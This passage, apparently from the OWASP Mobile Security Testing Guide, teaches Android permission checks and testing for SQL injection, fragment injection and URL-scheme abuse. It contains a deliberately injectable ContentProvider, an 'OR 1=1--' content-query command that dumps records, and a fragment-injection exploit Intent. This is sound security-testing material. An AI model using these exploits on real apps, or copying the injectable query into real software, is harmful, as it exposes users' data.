\texttt{android:protectionLevel}.

It is crucial to create custom permissions that adhere to the
\emph{Principle of Least Privilege}: permission should be defined
explicitly for its purpose, with a meaningful and accurate label and
description.

Below is an example of a custom permission called
\texttt{START\_MAIN\_ACTIVITY}, which is required when launching the
\texttt{TEST\_ACTIVITY} Activity.

The first code block defines the new permission, which is
self-explanatory. The label tag is a summary of the permission, and the
description is a more detailed version of the summary. You can set the
protection level according to the types of permissions that will be
granted. Once you've defined your permission, you can enforce it by
adding it to the application's manifest. In our example, the second
block represents the component that we are going to restrict with the
permission we created. It can be enforced by adding the
\texttt{android:permission} attributes.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<permission}\OtherTok{ android:name=}\StringTok{"com.example.myapp.permission.START\_MAIN\_ACTIVITY"}
\OtherTok{        android:label=}\StringTok{"Start Activity in myapp"}
\OtherTok{        android:description=}\StringTok{"Allow the app to launch the activity of myapp app, any app you grant this permission will be able to launch main activity by myapp app."}
\OtherTok{        android:protectionLevel=}\StringTok{"normal"} \KeywordTok{/>}

\KeywordTok{<activity}\OtherTok{ android:name=}\StringTok{"TEST\_ACTIVITY"}
\OtherTok{    android:permission=}\StringTok{"com.example.myapp.permission.START\_MAIN\_ACTIVITY"}\KeywordTok{>}
    \KeywordTok{<intent{-}filter>}
        \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"android.intent.action.MAIN"} \KeywordTok{/>}
        \KeywordTok{<category}\OtherTok{ android:name=}\StringTok{"android.intent.category.LAUNCHER"} \KeywordTok{/>}
     \KeywordTok{</intent{-}filter>}
\KeywordTok{</activity>}
\end{Highlighting}
\end{Shaded}

Once the permission \texttt{START\_MAIN\_ACTIVITY} has been created,
apps can request it via the \texttt{uses-permission} tag in the
\texttt{AndroidManifest.xml} file. Any application granted the custom
permission \texttt{START\_MAIN\_ACTIVITY} can then launch the
\texttt{TEST\_ACTIVITY}. Please note
\texttt{\textless{}uses-permission\ android:name="myapp.permission.START\_MAIN\_ACTIVITY"\ /\textgreater{}}
must be declared before the
\texttt{\textless{}application\textgreater{}} or an exception will occur
at runtime. Please see the example below that is based on the
\href{https://developer.android.com/guide/topics/permissions/overview}{permission
overview} and
\href{https://developer.android.com/guide/topics/manifest/manifest-intro\#filestruct}{manifest-intro}.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<manifest>}
\KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"com.example.myapp.permission.START\_MAIN\_ACTIVITY"} \KeywordTok{/>}
        \KeywordTok{<application>}
            \KeywordTok{<activity>}
            \KeywordTok{</activity>}
        \KeywordTok{</application>}
\KeywordTok{</manifest>}
\end{Highlighting}
\end{Shaded}

We recommend using a reverse-domain annotation when registering a
permission, as in the example above
(e.g.~\texttt{com.domain.application.permission}) in order to avoid
collisions with other applications.

\hypertarget{static-analysis-32}{%
\paragraph{Static Analysis}\label{static-analysis-32}}

\hypertarget{android-permissions}{%
\subparagraph{Android Permissions}\label{android-permissions}}

Check permissions to make sure that the app really needs them and remove
unnecessary permissions. For example, the \texttt{INTERNET} permission
in the AndroidManifest.xml file is necessary for an Activity to load a
web page into a WebView. Because a user can revoke an application's
right to use a dangerous permission, the developer should check whether
the application has the appropriate permission each time an action is
performed that would require that permission.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"android.permission.INTERNET"} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}

Go through the permissions with the developer to identify the purpose of
every permission set and remove unnecessary permissions.

Besides going through the AndroidManifest.xml file manually, you can
also use the Android Asset Packaging tool (aapt) to examine the
permissions of an APK file.

\begin{quote}
aapt comes with the Android SDK within the build-tools folder. It
requires an APK file as input. You may list the APKs in the device by
running
\texttt{adb\ shell\ pm\ list\ packages\ -f\ \textbar{}\ grep\ -i\ \textless{}keyword\textgreater{}}
as seen in
``\href{0x05b-Basic-Security_Testing.md\#listing-installed-apps}{Listing
Installed Apps}''.
\end{quote}

\begin{verbatim}
$ aapt d permissions app-x86-debug.apk
package: sg.vp.owasp_mobile.omtg_android
uses-permission: name='android.permission.WRITE_EXTERNAL_STORAGE'
uses-permission: name='android.permission.INTERNET'
\end{verbatim}

Alternatively you may obtain a more detailed list of permissions via adb
and the dumpsys tool:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{adb}\NormalTok{ shell dumpsys package sg.vp.owasp\_mobile.omtg\_android }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ permission}
    \ExtensionTok{requested}\NormalTok{ permissions:}
      \ExtensionTok{android.permission.WRITE\_EXTERNAL\_STORAGE}
      \ExtensionTok{android.permission.INTERNET}
      \ExtensionTok{android.permission.READ\_EXTERNAL\_STORAGE}
    \FunctionTok{install}\NormalTok{ permissions:}
      \ExtensionTok{android.permission.INTERNET}\NormalTok{: granted=true}
      \ExtensionTok{runtime}\NormalTok{ permissions:}
\end{Highlighting}
\end{Shaded}

Please reference this
\href{https://developer.android.com/guide/topics/permissions/overview\#permission-groups}{permissions
overview} for descriptions of the listed permissions that are considered
dangerous.

\begin{verbatim}
READ_CALENDAR
WRITE_CALENDAR
READ_CALL_LOG
WRITE_CALL_LOG
PROCESS_OUTGOING_CALLS
CAMERA
READ_CONTACTS
WRITE_CONTACTS
GET_ACCOUNTS
ACCESS_FINE_LOCATION
ACCESS_COARSE_LOCATION
RECORD_AUDIO
READ_PHONE_STATE
READ_PHONE_NUMBERS
CALL_PHONE
ANSWER_PHONE_CALLS
ADD_VOICEMAIL
USE_SIP
BODY_SENSORS
SEND_SMS
RECEIVE_SMS
READ_SMS
RECEIVE_WAP_PUSH
RECEIVE_MMS
READ_EXTERNAL_STORAGE
WRITE_EXTERNAL_STORAGE
\end{verbatim}

\hypertarget{custom-permissions-1}{%
\subparagraph{Custom Permissions}\label{custom-permissions-1}}

Apart from enforcing custom permissions via the application manifest
file, you can also check permissions programmatically. This is not
recommended, however, because it is more error-prone and can be bypassed
more easily with, e.g., runtime instrumentation. It is recommended that
the \texttt{ContextCompat.checkSelfPermission} method is called to check
if an activity has a specified permission. Whenever you see code like
the following snippet, make sure that the same permissions are enforced
in the manifest file.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ TAG = }\StringTok{"LOG"}\NormalTok{;}
\DataTypeTok{int}\NormalTok{ canProcess = }\FunctionTok{checkCallingOrSelfPermission}\NormalTok{(}\StringTok{"com.example.perm.READ\_INCOMING\_MSG"}\NormalTok{);}
\KeywordTok{if}\NormalTok{ (canProcess != PERMISSION\_GRANTED)}
\KeywordTok{throw} \KeywordTok{new} \BuiltInTok{SecurityException}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Or with \texttt{ContextCompat.checkSelfPermission} which compares it to
the manifest file.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{if}\NormalTok{ (ContextCompat.}\FunctionTok{checkSelfPermission}\NormalTok{(secureActivity.}\FunctionTok{this}\NormalTok{, }\BuiltInTok{Manifest}\NormalTok{.}\FunctionTok{READ\_INCOMING\_MSG}\NormalTok{)}
\NormalTok{        != PackageManager.}\FunctionTok{PERMISSION\_GRANTED}\NormalTok{) \{}
            \CommentTok{//!= stands for not equals PERMISSION\_GRANTED}
\NormalTok{            Log.}\FunctionTok{v}\NormalTok{(TAG, }\StringTok{"Permission denied"}\NormalTok{);}
\NormalTok{        \}}
\end{Highlighting}
\end{Shaded}

\hypertarget{requesting-permissions-1}{%
\paragraph{Requesting Permissions}\label{requesting-permissions-1}}

If your application has permissions that need to be requested at
runtime, the application must call the \texttt{requestPermissions}
method in order to obtain them. The app passes the permissions needed
and an integer request code you have specified to the user
asynchronously, returning once the user chooses to accept or deny the
request in the same thread. After the response is returned the same
request code is passed to the app's callback method.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final} \BuiltInTok{String}\NormalTok{ TAG = }\StringTok{"LOG"}\NormalTok{;}
\CommentTok{// We start by checking the permission of the current Activity}
\KeywordTok{if}\NormalTok{ (ContextCompat.}\FunctionTok{checkSelfPermission}\NormalTok{(secureActivity.}\FunctionTok{this}\NormalTok{,}
        \BuiltInTok{Manifest}\NormalTok{.}\FunctionTok{permission}\NormalTok{.}\FunctionTok{WRITE\_EXTERNAL\_STORAGE}\NormalTok{)}
\NormalTok{        != PackageManager.}\FunctionTok{PERMISSION\_GRANTED}\NormalTok{) \{}

    \CommentTok{// Permission is not granted}
    \CommentTok{// Should we show an explanation?}
    \KeywordTok{if}\NormalTok{ (ActivityCompat.}\FunctionTok{shouldShowRequestPermissionRationale}\NormalTok{(secureActivity.}\FunctionTok{this}\NormalTok{,}
        \CommentTok{//Gets whether you should show UI with rationale for requesting permission.}
        \CommentTok{//You should do this only if you do not have permission and the permission requested rationale is not communicated clearly to the user.}
            \BuiltInTok{Manifest}\NormalTok{.}\FunctionTok{permission}\NormalTok{.}\FunctionTok{WRITE\_EXTERNAL\_STORAGE}\NormalTok{)) \{}
        \CommentTok{// Asynchronous thread waits for the users response.}
        \CommentTok{// After the user sees the explanation try requesting the permission again.}
\NormalTok{    \} }\KeywordTok{else}\NormalTok{ \{}
        \CommentTok{// Request a permission that doesn\textquotesingle{}t need to be explained.}
\NormalTok{        ActivityCompat.}\FunctionTok{requestPermissions}\NormalTok{(secureActivity.}\FunctionTok{this}\NormalTok{,}
                \KeywordTok{new} \BuiltInTok{String}\NormalTok{[]\{}\BuiltInTok{Manifest}\NormalTok{.}\FunctionTok{permission}\NormalTok{.}\FunctionTok{WRITE\_EXTERNAL\_STORAGE}\NormalTok{\},}
\NormalTok{                MY\_PERMISSIONS\_REQUEST\_WRITE\_EXTERNAL\_STORAGE);}
        \CommentTok{// MY\_PERMISSIONS\_REQUEST\_WRITE\_EXTERNAL\_STORAGE will be the app{-}defined int constant.}
        \CommentTok{// The callback method gets the result of the request.}
\NormalTok{    \}}
\NormalTok{\} }\KeywordTok{else}\NormalTok{ \{}
    \CommentTok{// Permission already granted debug message printed in terminal.}
\NormalTok{    Log.}\FunctionTok{v}\NormalTok{(TAG, }\StringTok{"Permission already granted."}\NormalTok{);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Please note that if you need to provide any information or explanation
to the user it needs to be done before the call to
\texttt{requestPermissions}, since the system dialog box can not be
altered once called.

\hypertarget{handling-responses-to-permission-requests}{%
\paragraph{Handling Responses to Permission
Requests}\label{handling-responses-to-permission-requests}}

Now your app has to override the system method
\texttt{onRequestPermissionsResult} to see if the permission was
granted. This method receives the \texttt{requestCode} integer as input
parameter (which is the same request code that was created in
\texttt{requestPermissions}).

The following callback method may be used for
\texttt{WRITE\_EXTERNAL\_STORAGE}.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@Override} \CommentTok{//Needed to override system method onRequestPermissionsResult()}
\KeywordTok{public} \DataTypeTok{void} \FunctionTok{onRequestPermissionsResult}\NormalTok{(}\DataTypeTok{int}\NormalTok{ requestCode, }\CommentTok{//requestCode is what you specified in requestPermissions()}
        \BuiltInTok{String}\NormalTok{ permissions[], }\DataTypeTok{int}\NormalTok{[] permissionResults) \{}
    \KeywordTok{switch}\NormalTok{ (requestCode) \{}
        \KeywordTok{case}\NormalTok{ MY\_PERMISSIONS\_WRITE\_EXTERNAL\_STORAGE: \{}
            \KeywordTok{if}\NormalTok{ (grantResults.}\FunctionTok{length}\NormalTok{ > }\DecValTok{0}
\NormalTok{                \&\& permissionResults[}\DecValTok{0}\NormalTok{] == PackageManager.}\FunctionTok{PERMISSION\_GRANTED}\NormalTok{) \{}
                \CommentTok{// 0 is a canceled request, if int array equals requestCode permission is granted.}
\NormalTok{            \} }\KeywordTok{else}\NormalTok{ \{}
                \CommentTok{// permission denied code goes here.}
\NormalTok{                Log.}\FunctionTok{v}\NormalTok{(TAG, }\StringTok{"Permission denied"}\NormalTok{);}
\NormalTok{            \}}
            \KeywordTok{return}\NormalTok{;}
\NormalTok{        \}}
        \CommentTok{// Other switch cases can be added here for multiple permission checks.}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Permissions should be explicitly requested for every needed permission,
even if a similar permission from the same group has already been
requested. For applications targeting Android 7.1 (API level 25) and
older, Android will automatically give an application all the
permissions from a permission group, if the user grants one of the
requested permissions of that group. Starting with Android 8.0 (API
level 26), permissions will still automatically be granted if a user has
already granted a permission from the same permission group, but the
application still needs to explicitly request the permission. In this
case, the \texttt{onRequestPermissionsResult} handler will automatically
be triggered without any user interaction.

For example if both \texttt{READ\_EXTERNAL\_STORAGE} and
\texttt{WRITE\_EXTERNAL\_STORAGE} are listed in the Android Manifest but
only permissions are granted for \texttt{READ\_EXTERNAL\_STORAGE}, then
requesting \texttt{WRITE\_LOCAL\_STORAGE} will automatically have
permissions without user interaction because they are in the same group
and not explicitly requested.

\hypertarget{permission-analysis}{%
\paragraph{Permission Analysis}\label{permission-analysis}}

Always check whether the application is requesting permissions it
actually needs. Make sure that no permissions are requested which are
not related to the goal of the app. For instance: a single-player game
that requires access to \texttt{android.permission.WRITE\_SMS}, might
not be a good idea.

\hypertarget{dynamic-analysis-29}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-29}}

Permissions for installed applications can be retrieved with Drozer. The
following extract demonstrates how to examine the permissions used by an
application and the custom permissions defined by the app:

\begin{verbatim}
dz> run app.package.info -a com.android.mms.service
Package: com.android.mms.service
  Application Label: MmsService
  Process Name: com.android.phone
  Version: 6.0.1
  Data Directory: /data/user/0/com.android.mms.service
  APK Path: /system/priv-app/MmsService/MmsService.apk
  UID: 1001
  GID: [2001, 3002, 3003, 3001]
  Shared Libraries: null
  Shared User ID: android.uid.phone
  Uses Permissions:
  - android.permission.RECEIVE_BOOT_COMPLETED
  - android.permission.READ_SMS
  - android.permission.WRITE_SMS
  - android.permission.BROADCAST_WAP_PUSH
  - android.permission.BIND_CARRIER_SERVICES
  - android.permission.BIND_CARRIER_MESSAGING_SERVICE
  - android.permission.INTERACT_ACROSS_USERS
  Defines Permissions:
  - None
\end{verbatim}

When Android applications expose IPC components to other applications,
they can define permissions to control which applications can access the
components. For communication with a component protected by a
\texttt{normal} or \texttt{dangerous} permission, Drozer can be rebuilt
so that it includes the required permission:

\begin{verbatim}
$ drozer agent build  --permission android.permission.REQUIRED_PERMISSION
\end{verbatim}

Note that this method can't be used for \texttt{signature} level
permissions because Drozer would need to be signed by the certificate
used to sign the target application.

When doing the dynamic analysis: validate whether the permission
requested by the app is actually necessary for the app. For instance: a
single-player game that requires access to
\texttt{android.permission.WRITE\_SMS}, might not be a good idea.

\hypertarget{testing-for-injection-flaws-mstg-platform-2}{%
\subsubsection{Testing for Injection Flaws
(MSTG-PLATFORM-2)}\label{testing-for-injection-flaws-mstg-platform-2}}

\hypertarget{overview-25}{%
\paragraph{Overview}\label{overview-25}}

Android apps can expose functionality through custom URL schemes (which
are a part of Intents). They can expose functionality to

\begin{itemize}
\tightlist
\item
  other apps (via IPC mechanisms, such as Intents, Binders, Android
  Shared Memory (ASHMEM), or BroadcastReceivers),
\item
  the user (via the user interface).
\end{itemize}

None of the input from these sources can be trusted; it must be
validated and/or sanitized. Validation ensures processing of data that
the app is expecting only. If validation is not enforced, any input can
be sent to the app, which may allow an attacker or malicious app to
exploit app functionality.

The following portions of the source code should be checked if any app
functionality has been exposed:

\begin{itemize}
\tightlist
\item
  Custom URL schemes. Check the test case ``Testing Custom URL Schemes''
  as well for further test scenarios.
\item
  IPC Mechanisms (Intents, Binders, Android Shared Memory, or
  BroadcastReceivers). Check the test case ``Testing Whether Sensitive
  Data Is Exposed via IPC Mechanisms'' as well for further test
  scenarios.
\item
  User interface
\end{itemize}

An example of a vulnerable IPC mechanism is shown below.

You can use \emph{ContentProviders} to access database information, and
you can probe services to see if they return data. If data is not
validated properly, the content provider may be prone to SQL injection
while other apps are interacting with it. See the following vulnerable
implementation of a \emph{ContentProvider}.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<provider}
\OtherTok{    android:name=}\StringTok{".OMTG\_CODING\_003\_SQL\_Injection\_Content\_Provider\_Implementation"}
\OtherTok{    android:authorities=}\StringTok{"sg.vp.owasp\_mobile.provider.College"}\KeywordTok{>}
\KeywordTok{</provider>}
\end{Highlighting}
\end{Shaded}

The \texttt{AndroidManifest.xml} above defines a content provider that's
exported and therefore available to all other apps. The \texttt{query}
function in the
\texttt{OMTG\_CODING\_003\_SQL\_Injection\_Content\_Provider\_Implementation.java}
class should be inspected.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@Override}
\KeywordTok{public} \BuiltInTok{Cursor} \FunctionTok{query}\NormalTok{(Uri uri, }\BuiltInTok{String}\NormalTok{[] projection, }\BuiltInTok{String}\NormalTok{ selection,}\BuiltInTok{String}\NormalTok{[] selectionArgs, }\BuiltInTok{String}\NormalTok{ sortOrder) \{}
\NormalTok{    SQLiteQueryBuilder qb = }\KeywordTok{new} \FunctionTok{SQLiteQueryBuilder}\NormalTok{();}
\NormalTok{    qb.}\FunctionTok{setTables}\NormalTok{(STUDENTS\_TABLE\_NAME);}

    \KeywordTok{switch}\NormalTok{ (uriMatcher.}\FunctionTok{match}\NormalTok{(uri)) \{}
        \KeywordTok{case}\NormalTok{ STUDENTS:}
\NormalTok{            qb.}\FunctionTok{setProjectionMap}\NormalTok{(STUDENTS\_PROJECTION\_MAP);}
            \KeywordTok{break}\NormalTok{;}

        \KeywordTok{case}\NormalTok{ STUDENT\_ID:}
            \CommentTok{// SQL Injection when providing an ID}
\NormalTok{            qb.}\FunctionTok{appendWhere}\NormalTok{( \_ID + }\StringTok{"="}\NormalTok{ + uri.}\FunctionTok{getPathSegments}\NormalTok{().}\FunctionTok{get}\NormalTok{(}\DecValTok{1}\NormalTok{));}
\NormalTok{            Log.}\FunctionTok{e}\NormalTok{(}\StringTok{"appendWhere"}\NormalTok{,uri.}\FunctionTok{getPathSegments}\NormalTok{().}\FunctionTok{get}\NormalTok{(}\DecValTok{1}\NormalTok{).}\FunctionTok{toString}\NormalTok{());}
            \KeywordTok{break}\NormalTok{;}

        \KeywordTok{default}\NormalTok{:}
            \KeywordTok{throw} \KeywordTok{new} \BuiltInTok{IllegalArgumentException}\NormalTok{(}\StringTok{"Unknown URI "}\NormalTok{ + uri);}
\NormalTok{    \}}

    \KeywordTok{if}\NormalTok{ (sortOrder == }\KeywordTok{null}\NormalTok{ || sortOrder == }\StringTok{""}\NormalTok{)\{}
        \CommentTok{/**}
         \CommentTok{*}\NormalTok{ By default sort on student names}
         \CommentTok{*/}
\NormalTok{        sortOrder = NAME;}
\NormalTok{    \}}
    \BuiltInTok{Cursor}\NormalTok{ c = qb.}\FunctionTok{query}\NormalTok{(db, projection, selection, selectionArgs,}\KeywordTok{null}\NormalTok{, }\KeywordTok{null}\NormalTok{, sortOrder);}

    \CommentTok{/**}
     \CommentTok{*}\NormalTok{ register to watch a content URI for changes}
     \CommentTok{*/}
\NormalTok{    c.}\FunctionTok{setNotificationUri}\NormalTok{(}\FunctionTok{getContext}\NormalTok{().}\FunctionTok{getContentResolver}\NormalTok{(), uri);}
    \KeywordTok{return}\NormalTok{ c;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

While the user is providing a STUDENT\_ID at
\texttt{content://sg.vp.owasp\_mobile.provider.College/students}, the
query statement is prone to SQL injection. Obviously
\href{https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet}{prepared
statements} must be used to avoid SQL injection, but
\href{https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet}{input
validation} should also be applied so that only input that the app is
expecting is processed.

All app functions that process data coming in through the UI should
implement input validation:

\begin{itemize}
\tightlist
\item
  For user interface input,
  \href{https://github.com/ragunathjawahar/android-saripaar}{Android
  Saripaar v2} can be used.
\item
  For input from IPC or URL schemes, a validation function should be
  created. For example, the following determines whether the
  \href{https://stackoverflow.com/questions/11241690/regex-for-checking-if-a-string-is-strictly-alphanumeric}{string
  is alphanumeric}:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{isAlphaNumeric}\NormalTok{(}\BuiltInTok{String}\NormalTok{ s)\{}
    \BuiltInTok{String}\NormalTok{ pattern= }\StringTok{"\^{}[a{-}zA{-}Z0{-}9]*$"}\NormalTok{;}
    \KeywordTok{return}\NormalTok{ s.}\FunctionTok{matches}\NormalTok{(pattern);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

An alternative to validation functions is type conversion, with, for
example, \texttt{Integer.parseInt} if only integers are expected. The
\href{https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet}{OWASP
Input Validation Cheat Sheet} contains more information about this
topic.

\hypertarget{dynamic-analysis-30}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-30}}

The tester should manually test the input fields with strings like
\texttt{OR\ 1=1-\/-} if, for example, a local SQL injection
vulnerability has been identified.

On a rooted device, the command content can be used to query the data
from a content provider. The following command queries the vulnerable
function described above.

\begin{verbatim}
# content query --uri content://sg.vp.owasp_mobile.provider.College/students
\end{verbatim}

SQL injection can be exploited with the following command. Instead of
getting the record for Bob only, the user can retrieve all data.

\begin{verbatim}
# content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
\end{verbatim}

Drozer can also be used for dynamic testing.

\hypertarget{testing-for-fragment-injection-mstg-platform-2}{%
\subsubsection{Testing for Fragment Injection
(MSTG-PLATFORM-2)}\label{testing-for-fragment-injection-mstg-platform-2}}

\hypertarget{overview-26}{%
\paragraph{Overview}\label{overview-26}}

Android SDK offers developers a way to present a
\href{https://developer.android.com/reference/android/preference/PreferenceActivity.html}{\texttt{Preferences\ activity}}
to users, allowing the developers to extend and adapt this abstract
class.

This abstract class parses the extra data fields of an Intent, in
particular, the
\texttt{PreferenceActivity.EXTRA\_SHOW\_FRAGMENT(:android:show\_fragment)}
and
\texttt{PreferenceActivity.EXTRA\_SHOW\_FRAGMENT\_ARGUMENTS(:android:show\_fragment\_arguments)}
fields.

The first field is expected to contain the \texttt{Fragment} class name,
and the second one is expected to contain the input bundle passed to the
\texttt{Fragment}.

Because the \texttt{PreferenceActivity} uses reflection to load the
fragment, an arbitrary class may be loaded inside the package or the
Android SDK. The loaded class runs in the context of the application
that exports this activity.

With this vulnerability, an attacker can call fragments inside the
target application or run the code present in other classes'
constructors. Any class that's passed in the Intent and does not extend
the Fragment class will cause a \texttt{java.lang.CastException}, but
the empty constructor will be executed before the exception is thrown,
allowing the code present in the class constructor run.

To prevent this vulnerability, a new method called
\texttt{isValidFragment} was added in Android 4.4 (API level 19). It
allows developers to override this method and define the fragments that
may be used in this context.

The default implementation returns \texttt{true} on versions older than
Android 4.4 (API level 19); it will throw an exception on later
versions.

\hypertarget{static-analysis-33}{%
\paragraph{Static Analysis}\label{static-analysis-33}}

Steps:

\begin{itemize}
\tightlist
\item
  Check if \texttt{android:targetSdkVersion} less than 19.
\item
  Find exported Activities that extend the \texttt{PreferenceActivity}
  class.
\item
  Determine whether the method \texttt{isValidFragment} has been
  overridden.
\item
  If the app currently sets its \texttt{android:targetSdkVersion} in the
  manifest to a value less than 19 and the vulnerable class does not
  contain any implementation of \texttt{isValidFragment} then, the
  vulnerability is inherited from the \texttt{PreferenceActivity}.
\item
  In order to fix, developers should either update the
  \texttt{android:targetSdkVersion} to 19 or higher. Alternatively, if
  the \texttt{android:targetSdkVersion} cannot be updated, then
  developers should implement \texttt{isValidFragment} as described.
\end{itemize}

The following example shows an Activity that extends this activity:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MyPreferences }\KeywordTok{extends}\NormalTok{ PreferenceActivity \{}
    \AttributeTok{@Override}
    \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{(Bundle savedInstanceState) \{}
        \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{(savedInstanceState);}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

The following examples show the \texttt{isValidFragment} method being
overridden with an implementation that allows the loading of
\texttt{MyPreferenceFragment} only:

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@Override}
\KeywordTok{protected} \DataTypeTok{boolean} \FunctionTok{isValidFragment}\NormalTok{(}\BuiltInTok{String}\NormalTok{ fragmentName)}
\NormalTok{\{}
\KeywordTok{return} \StringTok{"com.fullpackage.MyPreferenceFragment"}\NormalTok{.}\FunctionTok{equals}\NormalTok{(fragmentName);}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{example-of-vulnerable-app-and-exploitation}{%
\paragraph{Example of Vulnerable App and
Exploitation}\label{example-of-vulnerable-app-and-exploitation}}

MainActivity.class

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MainActivity }\KeywordTok{extends}\NormalTok{ PreferenceActivity \{}
    \KeywordTok{protected} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{(Bundle savedInstanceState) \{}
        \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{(savedInstanceState);}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

MyFragment.class

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MyFragment }\KeywordTok{extends}\NormalTok{ Fragment \{}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onCreate}\NormalTok{ (Bundle savedInstanceState) \{}
        \KeywordTok{super}\NormalTok{.}\FunctionTok{onCreate}\NormalTok{(savedInstanceState);}
\NormalTok{    \}}
    \KeywordTok{public} \BuiltInTok{View} \FunctionTok{onCreateView}\NormalTok{(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) \{}
        \BuiltInTok{View}\NormalTok{ v = inflater.}\FunctionTok{inflate}\NormalTok{(R.}\FunctionTok{layout}\NormalTok{.}\FunctionTok{fragmentLayout}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\NormalTok{        WebView myWebView = (WebView) wv.}\FunctionTok{findViewById}\NormalTok{(R.}\FunctionTok{id}\NormalTok{.}\FunctionTok{webview}\NormalTok{);}
\NormalTok{        myWebView.}\FunctionTok{getSettings}\NormalTok{().}\FunctionTok{setJavaScriptEnabled}\NormalTok{(}\KeywordTok{true}\NormalTok{);}
\NormalTok{        myWebView.}\FunctionTok{loadUrl}\NormalTok{(}\KeywordTok{this}\NormalTok{.}\FunctionTok{getActivity}\NormalTok{().}\FunctionTok{getIntent}\NormalTok{().}\FunctionTok{getDataString}\NormalTok{());}
        \KeywordTok{return}\NormalTok{ v;}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

To exploit this vulnerable Activity, you can create an application with
the following code:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Intent i = }\KeywordTok{new} \FunctionTok{Intent}\NormalTok{();}
\NormalTok{i.}\FunctionTok{setFlags}\NormalTok{(Intent.}\FunctionTok{FLAG\_ACTIVITY\_CLEAR\_TASK}\NormalTok{);}
\NormalTok{i.}\FunctionTok{setClassName}\NormalTok{(}\StringTok{"pt.claudio.insecurefragment"}\NormalTok{,}\StringTok{"pt.claudio.insecurefragment.MainActivity"}\NormalTok{);}
\NormalTok{i.}\FunctionTok{putExtra}\NormalTok{(}\StringTok{":android:show\_fragment"}\NormalTok{,}\StringTok{"pt.claudio.insecurefragment.MyFragment"}\NormalTok{);}
\NormalTok{Intent intent = i.}\FunctionTok{setData}\NormalTok{(Uri.}\FunctionTok{parse}\NormalTok{(}\StringTok{"https://security.claudio.pt"}\NormalTok{));}
\FunctionTok{startActivity}\NormalTok{(i);}
\end{Highlighting}
\end{Shaded}

The
\href{https://github.com/clviper/android-fragment-injection/raw/master/vulnerableapp.apk}{Vulnerable
App} and
\href{https://github.com/clviper/android-fragment-injection/blob/master/exploit.apk}{Exploit
PoC App} are available for downloading.

\hypertarget{testing-custom-url-schemes-mstg-platform-3}{%
\subsubsection{Testing Custom URL Schemes
(MSTG-PLATFORM-3)}\label{testing-custom-url-schemes-mstg-platform-3}}

\hypertarget{overview-27}{%
\paragraph{Overview}\label{overview-27}}

Both Android and iOS allow inter-app communication via custom URL
schemes. These custom URLs allow other applications to perform specific
actions within the application that offers the custom URL scheme. Custom
URIs can begin with any scheme prefix, and they usually define an action
to take within the application and parameters for that action.

Consider this contrived example:
\texttt{sms://compose/to=your.boss@company.com\&message=I\%20QUIT!\&sendImmediately=true}.
When a victim clicks such a link on a mobile device, the vulnerable SMS
application will send the SMS message with the maliciously crafted
content. This could lead to

\begin{itemize}
\tightlist
\item
  financial loss for the victim if messages are sent to premium services
  or
\item
  disclosure of the victim's phone number if messages are sent to
  predefined addresses that collect phone numbers.
\end{itemize}

Once a URL scheme has been defined, multiple apps can register for any
available scheme. For every application, each of these custom URL
schemes must be enumerated and the actions they perform must be tested.

URL schemes can be used for
\href{https://developer.android.com/training/app-links/}{deep linking},
a widespread and convenient way to launch a native mobile app via a
link, which isn't inherently risky. Alternatively, since Android 6.0
(API level 23) App links can be used. App lnks, in contrast to deep
links, require the domain of which the link is served to have a
\href{https://developers.google.com/digital-asset-links/v1/getting-started}{digital
asset link} and will ask the app to verify the asset-link first by means
of using \texttt{android:autoVerify="true"} in the intentfilter.

Nevertheless, data that's processed by the app and comes in through URL
schemes should be validated as any content:

\begin{itemize}
\tightlist
\item
  When using reflection-based persistence type of data processing, check
  the section ``Testing Object Persistence'' for Android.
\item
  Using the data for queries? Make sure you make parameterized queries.
\item
